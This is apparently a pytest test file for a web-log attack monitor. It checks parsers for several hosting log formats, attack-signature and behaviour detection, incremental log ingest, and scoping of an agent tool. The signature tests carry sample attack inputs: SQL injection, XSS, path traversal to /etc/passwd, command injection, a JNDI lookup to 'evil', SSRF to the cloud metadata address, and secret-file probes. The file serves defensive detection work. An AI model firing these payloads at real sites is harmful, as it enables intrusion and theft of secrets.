"""Attack monitoring from access logs: parsing, detection, incremental ingest and agent wiring."""
from __future__ import annotations

import gzip
import json

import pytest

from bughunter.app import Application
from bughunter.site_monitor.detectors import behaviours, signatures
from bughunter.site_monitor.parsers import detect_format, parse, parse_alb, parse_combined, parse_json, parser_for

NGINX = '203.0.113.9 - - [17/Nov/2026:10:00:{s:02d} +0000] "{m} {p} HTTP/1.1" {st} {sz} "-" "{ua}"'


def nginx(path, status=200, size=512, method="GET", ua="Mozilla/5.0", second=0, ip="203.0.113.9"):
    return NGINX.format(s=second % 60, m=method, p=path, st=status, sz=size, ua=ua).replace("203.0.113.9", ip, 1)


def test_parsers_cover_common_hosts():
    combined = parse_combined('example.com 198.51.100.4 - - [17/Nov/2026:10:00:00 +0000] "GET /a?b=1 HTTP/2.0" 200 12 "-" "curl/8"')
    assert combined["ip"] == "198.51.100.4" and combined["host"] == "example.com" and combined["query"] == "b=1"
    assert combined["time"].startswith("2026-11-17T10:00:00")
    alb = parse_alb('https 2026-11-17T10:00:00.1Z app/lb/1 198.51.100.5:4431 10.0.0.1:80 0.001 0.002 0.000 404 404 34 '
                    '120 "GET https://shop.example.test:443/.env HTTP/1.1" "sqlmap/1.7" ECDHE TLSv1.2 arn - "Root=1" "shop" "arn"')
    assert alb["path"] == "/.env" and alb["status"] == 404 and alb["ua"] == "sqlmap/1.7"
    vercel = parse_json(json.dumps({"timestamp": 1794909218000, "proxy": {"clientIp": "198.51.100.6", "method": "POST",
                                    "path": "/api/login", "statusCode": 401, "userAgent": ["x"], "host": "app.vercel.app"}}))
    assert vercel["ip"] == "198.51.100.6" and vercel["method"] == "POST" and vercel["status"] == 401
    cloudflare = parse_json(json.dumps({"ClientIP": "198.51.100.7", "ClientRequestMethod": "GET", "ClientRequestPath": "/search",
                                        "ClientRequestQuery": "?q=<script>", "EdgeResponseStatus": 403, "Action": "block",
                                        "EdgeStartTimestamp": "2026-11-17T10:00:00Z"}))
    assert cloudflare["query"] == "q=<script>" and cloudflare["waf_action"] == "block"
    gcp = parse_json(json.dumps({"httpRequest": {"remoteIp": "198.51.100.8", "requestMethod": "GET",
                                                 "requestUrl": "https://site.test/x?id=1", "status": 200}, "timestamp": "2026-11-17T10:00:00Z"}))
    assert gcp["path"] == "/x" and gcp["query"] == "id=1"
    header = "#Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status sc-bytes cs(User-Agent)"
    w3c = parse(parser_for("w3c", header), "2026-11-17\t10:00:00\t198.51.100.9\tGET\t/wp-config.php\t-\t200\t900\tcurl")
    assert w3c["path"] == "/wp-config.php" and w3c["time"].startswith("2026-11-17T10:00:00")
    assert detect_format([nginx("/")])[0] == "combined"
    assert detect_format([json.dumps({"ip": "1.2.3.4", "path": "/"})])[0] == "json"
    with pytest.raises(ValueError):
        detect_format(["not a log line", "neither is this"])


@pytest.mark.parametrize("path,expected", [
    ("/.env", "sensitive_file_probe"), ("/.git/config", "sensitive_file_probe"), ("/backup.sql", "sensitive_file_probe"),
    ("/download?file=../../etc/passwd", "path_traversal"), ("/item?id=1%20UNION%20SELECT%20password%20FROM%20users", "sql_injection"),
    ("/item?id=1'%20OR%20'1'='1", "sql_injection"), ("/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "xss"),
    ("/ping?host=127.0.0.1;cat%20/etc/hosts", "command_injection"), ("/x?name={{7*7}}", "template_injection"),
    ("/x?q=${jndi:ldap://evil/a}", "template_injection"), ("/fetch?url=http://169.254.169.254/latest/meta-data/", "ssrf_attempt"),
    ("/fetch?url=http://127.0.0.1:8080/admin", "ssrf_attempt"), ("/login?next=https://evil.example/", "open_redirect"),
])
def test_signatures(path, expected):
    event = parse_combined(nginx(path))
    assert expected in signatures(event)


def test_benign_requests_are_quiet():
    for path in ("/", "/products/42", "/search?q=red+shoes", "/.well-known/security.txt", "/api/orders?page=2",
                 "/fetch?url=https://cdn.example.com/a.png", "/login?next=/account"):
        assert signatures(parse_combined(nginx(path))) == [], path
    assert "scanner" in signatures(parse_combined(nginx("/", ua="Mozilla/5.0 (compatible; Nuclei - Open-source project)")))


def test_behaviours_detect_discovery_bruteforce_and_enumeration():
    events = [parse_combined(nginx(f"/admin{i}", status=404, second=i)) for i in range(35)]
    events += [parse_combined(nginx("/api/login", status=401, method="POST", second=i, ip="198.51.100.20")) for i in range(12)]
    events += [parse_combined(nginx(f"/api/orders/{1000 + i}", status=200, second=i, ip="198.51.100.30")) for i in range(20)]
    events += [parse_combined(nginx(f"/p/{i}", status=200, second=i, ip="198.51.100.40")) for i in range(5)]
    found = {(t, ip): d for t, ip, _, d in behaviours(events)}
    assert found[("content_discovery", "203.0.113.9")]["not_found"] == 35
    assert found[("login_bruteforce", "198.51.100.20")]["attempts"] == 12
    enum = found[("idor_enumeration", "198.51.100.30")]
    assert enum["route"] == "/api/orders/{id}" and enum["distinct_ids"] == 20 and enum["successful"] == 20
    assert not any(ip == "198.51.100.40" for _, ip in found)


@pytest.fixture
def app(tmp_path, monkeypatch):
    a = Application(tmp_path / "data", primary=False)
    monkeypatch.setattr(a.operator, "_loop", lambda *args: None)
    a.store.put("project", {"name": "Live site", "scope": ["https://shop.example.test/"], "authorization": "Owner"}, id="proj_live")
    yield a
    a.close()


def test_incremental_ingest_rotation_gzip_and_incidents(app, tmp_path):
    logs = tmp_path / "logs"
    logs.mkdir()
    access = logs / "access.log"
    access.write_text("\n".join([nginx("/.env", status=200, size=300), nginx("/"), nginx("/products/1")]) + "\n")
    monitor = app.site_monitor
    source = monitor.add_source("proj_live", str(logs))
    first = monitor.ingest(source["id"])
    assert first["format"] == "combined" and first["events"] == 3 and first["unparsed"] == 0
    incident = next(i for i in monitor.incidents("proj_live") if i["technique"] == "sensitive_file_probe")
    assert incident["severity"] == "critical" and incident["possibly_successful"] == 1      # served with 200
    assert "deny 203.0.113.9;" == incident["block_rules"]["nginx"] and "well-known" in incident["block_rules"]["nginx_route"]
    assert monitor.ingest(source["id"])["events"] == 0                                      # nothing new
    with access.open("a") as handle:
        handle.write(nginx("/.env", status=404, size=10) + "\npartial line without newline")
    again = monitor.ingest(source["id"])
    assert again["events"] == 1                                                             # partial line waits
    merged = next(i for i in monitor.incidents("proj_live") if i["technique"] == "sensitive_file_probe")
    assert merged["id"] == incident["id"] and merged["count"] == 2
    access.unlink()
    access.write_text(nginx("/download?file=../../etc/passwd", status=200) + "\n")         # rotation: new inode
    with gzip.open(logs / "access.log.1.gz", "wt") as handle:
        handle.write(nginx("/x?q=${jndi:ldap://a/b}") + "\n")
    rotated = monitor.ingest(source["id"])
    assert rotated["events"] == 2
    techniques = {i["technique"] for i in monitor.incidents("proj_live")}
    assert {"path_traversal", "template_injection"} <= techniques
    summary = monitor.summary("proj_live")
    assert summary["possibly_successful"] >= 2 and summary["by_severity"]["critical"] >= 2
    resolved = monitor.resolve(merged["id"], "fixed", "Removed .env from build output")
    assert resolved["status"] == "fixed"
    with pytest.raises(ValueError):
        monitor.add_source("proj_live", str(tmp_path / "missing"))
    with pytest.raises(ValueError):
        monitor.add_source("nope", str(logs))


def test_agent_tool_is_project_scoped_and_plan_mode_reads_only(app, tmp_path):
    from bughunter.operator_tools import OperatorTools
    log = tmp_path / "edge.jsonl"
    log.write_text("\n".join(json.dumps({"ClientIP": "198.51.100.50", "ClientRequestMethod": "GET",
                                         "ClientRequestPath": f"/api/users/{i}", "EdgeResponseStatus": 200,
                                         "EdgeResponseBytes": 100, "EdgeStartTimestamp": f"2026-11-17T10:00:{i:02d}Z"})
                             for i in range(16)) + "\n")
    chat = app.store.put("chat", {"title": "Live", "project_id": "proj_live", "messages": []})
    task = app.harness.start("Monitor my website for attacks", grants=["app"], id=chat["id"], web_search_mode="off")
    tools = OperatorTools(app, task["run_id"])
    assert {"site_monitor", "route_review"} <= {s["name"] for s in tools.specs()}
    source = tools.site_monitor("add_source", path=str(log))
    result = tools.site_monitor("ingest", source_id=source["id"])
    assert result["format"] == "json" and any(i["title"].startswith("Sequential object id") for i in result["incidents"])
    app.store.put("project", {"name": "Other", "scope": ["https://other.test/"], "authorization": "x"}, id="proj_other")
    other = app.site_monitor.add_source("proj_other", str(log))
    with pytest.raises(ValueError, match="this project"):
        tools.site_monitor("ingest", source_id=other["id"])
    plan_chat = app.store.put("chat", {"title": "Plan", "project_id": "proj_live", "messages": []})
    plan = app.harness.start("Monitor my website", grants=["app"], id=plan_chat["id"], execution_mode="plan", web_search_mode="off")
    planner = OperatorTools(app, plan["run_id"])
    assert planner.site_monitor("summary")["open_incidents"] >= 1
    with pytest.raises(PermissionError, match="Plan mode"):
        planner.site_monitor("ingest", source_id=source["id"])
    assert app.dispatch("monitor.summary", {"project_id": "proj_live"})["open_incidents"] >= 1
